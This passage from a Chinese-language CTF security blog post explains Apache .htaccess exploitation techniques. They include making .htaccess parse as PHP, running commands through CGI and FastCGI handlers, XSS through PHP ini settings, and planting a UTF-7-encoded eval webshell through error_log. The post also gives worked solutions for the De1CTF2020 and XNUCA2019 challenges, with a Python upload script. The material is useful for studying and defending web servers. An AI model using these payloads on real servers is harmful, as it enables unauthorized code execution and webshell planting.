+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_append_file .htaccess
+</span></span><span class="line"><span class="cl">#&lt;?php phpinfo();
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解析完会变成</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_append_file .htaccess #
+</span></span><span class="line"><span class="cl">下面把phpinfo解析了
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>方法二：
+这种适合同目录或子目录没有 <code>php</code> 文件。
+需要先设置允许可访问 <code>.htaccess</code> 文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;Files ~ &#34;^.ht&#34;&gt;
+</span></span><span class="line"><span class="cl"> Require all granted
+</span></span><span class="line"><span class="cl"> Order allow,deny
+</span></span><span class="line"><span class="cl"> Allow from all
+</span></span><span class="line"><span class="cl">&lt;/Files&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后再将 <code>.htaccess</code>指定当做 php文件处理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SetHandler application/x-httpd-php
+</span></span><span class="line"><span class="cl"># &lt;?php phpinfo(); ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后会被解析为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Require all granted Order allow,deny Allow from all SetHandler application/x-httpd-php #
+</span></span><span class="line"><span class="cl">下面phpinfo被解析了
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="命令执行">命令执行
+</h3><h4 id="cgi启动">CGI启动
+</h4><p><code>cgi_module</code> 需要加载，即 <code>apache</code> 配置文件中有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">LoadModule cgi_module modules/mod_cgi.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>.htaccess内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Options ExecCGI #允许CGI执行
+</span></span><span class="line"><span class="cl">AddHandler cgi-script .xx #将xx后缀名的文件，当做CGI程序进行解析
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ce.xx内容（弹计算器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#!C:/Windows/System32/cmd.exe /k start calc.exe
+</span></span><span class="line"><span class="cl">6
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>例题可看 [De1CTF2020 check in](<a class="link" href="https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check"  target="_blank" rel="noopener"
+    >https://github.com/De1ta-team/De1CTF2020/tree/master/writeup/web/check</a> in)</p>
+<h5 id="de1ctf2020-check-in">De1CTF2020 check in
+</h5><p>预期解</p>
+<p>.htaccess:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Options +ExecCGI
+</span></span><span class="line"><span class="cl">AddHandler cgi-script .xx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>1.xx:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#! /bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> Content-type: text/html
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat /flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注：这里讲下一个小坑，linux中cgi比较严格
+上传后发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。</p>
+<p>非预期解</p>
+<p>反斜杠绕过正则</p>
+<p>.htaccess:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AddType application/x-httpd-p\
+</span></span><span class="line"><span class="cl">hp .xx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>1.xx</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?=&#39;cat /flag&#39;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者白嫖flag</p>
+<p>利用apache的服务器状态信息(默认关闭)
+.htaccess:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SetHandler server-status
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上传文件后，访问自己的目录就发现是apache的服务器状态信息，可以看到其他人的访问本网站的记录</p>
+<h4 id="fastcgi启动">FastCGI启动
+</h4><p><code>mod_fcgid.so</code>需要被加载。即 <code>apache</code> 配置文件中有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">LoadModule fcgid_module modules/mod_fcgid.so
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>.htaccess</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Options +ExecCGI
+</span></span><span class="line"><span class="cl">AddHandler fcgid-script .xx
+</span></span><span class="line"><span class="cl">FcgidWrapper &#34;C:/Windows/System32/cmd.exe /k start calc.exe&#34; .xx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ce.xx内容随便填，就能弹计算器了</p>
+<h3 id="xss">XSS
+</h3><h4 id="highlight_file">highlight_file
+</h4><p>.htaccess</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value highlight.comment &#39;&#34;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中的 <code>highlight.comment</code> 也可以换成如下其他选项</p>
+<p><a class="link" href="https://www.php.net/manual/zh/misc.configuration.php#ini.syntax-highlighting"  target="_blank" rel="noopener"
+    >PHP: 运行时配置 - Manual</a></p>
+<p><img src="/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/image-20250406162432378.png"
+	width="1038"
+	height="293"
+	srcset="/p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/image-20250406162432378_hu11393571383554599564.png 480w, /p/apache%E7%9A%84.htaccess%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/image-20250406162432378_hu6172483451693091813.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250406162432378"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="354"
+		data-flex-basis="850px"
+	
+></p>
+<p>index.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">// comment
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>就会弹xss</p>
+<h4 id="错误消息链接">错误消息链接
+</h4><p>index.php ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">include(&#39;foo&#39;);#foo报错
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>.htaccess</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_flag display_errors 1
+</span></span><span class="line"><span class="cl">php_flag html_errors 1
+</span></span><span class="line"><span class="cl">php_value docref_root &#34;&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用报错来xss</p>
+<h4 id="自定义错误文件">自定义错误文件
+</h4><p>error.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php include(&#39;shell&#39;);#报错页面
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>.htaccess</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value error_log /tmp/www/html/shell.php 
+</span></span><span class="line"><span class="cl">php_value include_path &#34;&lt;?php phpinfo(); __halt_compiler();&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问 error.php，会报错并记录在 shell.php 文件中</p>
+<p>因为&lt;?标签会经过 html 编码，所以需要 UTF-7 来绕过。</p>
+<p>.htaccess</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 第一次
+</span></span><span class="line"><span class="cl">php_value error_log /tmp/shell #定义错误路径
+</span></span><span class="line"><span class="cl">#---- &#34;&lt;?php phpinfo(); __halt_compiler();&#34; in UTF-7:
+</span></span><span class="line"><span class="cl">php_value include_path &#34;+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 第二次
+</span></span><span class="line"><span class="cl">php_value include_path &#34;/tmp&#34; #将include()的默认路径改变
+</span></span><span class="line"><span class="cl">php_flag zend.multibyte 1
+</span></span><span class="line"><span class="cl">php_value zend.script_encoding &#34;UTF-7&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这种方法在这题有记录：<a class="link" href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp"  target="_blank" rel="noopener"
+    >OurChallenges/XNUCA2019Qualifier/Web/Ezphp at master · NeSE-Team/OurChallenges · GitHub</a></p>
+<h5 id="xnuca2019-ezphp">XNUCA2019 ezphp
+</h5><p>预期解</p>
+<p>htaccess生效</p>
+<p>如果尝试上传htaccess文件会发现出现响应500的问题，因为文件尾有Just one chance 这里采用<code># \</code>的方式将换行符转义成普通字符，就可以用<code>#</code>来注释单行了。</p>
+<p>利用文件包含</p>
+<p>代码中有一处<code>include_once(&quot;fl3g.php&quot;);</code>，php的配置选项中有include_path可以用来设置include的路径。如果tmp目录下有fl3g.php，在可以通过将include_path设置为tmp的方式来完成文件包含。</p>
+<p>tmp目录写文件</p>
+<ul>
+<li>如何在指定目录写指定文件名的文件呢？php的配置选项中有error_log可以满足这一点。error_log可以将php运行报错的记录写到指定文件中。</li>
+<li>如何触发报错呢？这就是为什么代码中写了一处不存在的fl3g.php的原因。我们可以将include_path的内容设置成payload的内容，这时访问页面，页面尝试将payload作为一个路径去访问时就会因为找不到fl3g.php而报错，而如果fl3g.php存在，则会因为include_path默认先访问web目录而不会报错。</li>
+<li>写进error_log的内容会被html编码怎么绕过？这个点是比较常见的，采用utf7编码即可。</li>
+</ul>
+<p>payload</p>
+<ul>
+<li>第一步，通过error_log配合include_path在tmp目录生成shell</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value error_log /tmp/fl3g.php
+</span></span><span class="line"><span class="cl">php_value error_reporting 32767
+</span></span><span class="line"><span class="cl">php_value include_path &#34;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&#34;
+</span></span><span class="line"><span class="cl"># \
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>第二步，通过include_path和utf7编码执行shell</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value include_path &#34;/tmp&#34;
+</span></span><span class="line"><span class="cl">php_value zend.multibyte 1
+</span></span><span class="line"><span class="cl">php_value zend.script_encoding &#34;UTF-7&#34;
+</span></span><span class="line"><span class="cl"># \
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>非预期1</p>
+<p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {</code>而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0) {</code>，因此存在了被绕过的可能。 通过设置.htaccess</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value pcre.backtrack_limit 0
+</span></span><span class="line"><span class="cl">php_value pcre.jit 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。</p>
+<p>非预期2</p>
+<p>反斜杠绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value auto_prepend_fi\
+</span></span><span class="line"><span class="cl">le &#34;.htaccess&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">htaccess</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;php_value auto_prepend_fi</span><span class="se">\\</span><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">le &#34;.htaccess&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">%23&lt;?php system(&#39;cat /????&#39;);?&gt;</span><span class="se">\\</span><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://ddd0daaf-fee4-4af5-b7bb-9f0d7dfbe6ef.node5.buuoj.cn:81/?filename=</span><span class="si">{}</span><span class="s1">&amp;content=</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;.htaccess&#39;</span><span class="p">,</span> <span class="n">htaccess</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/.htaccess/">.Htaccess</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
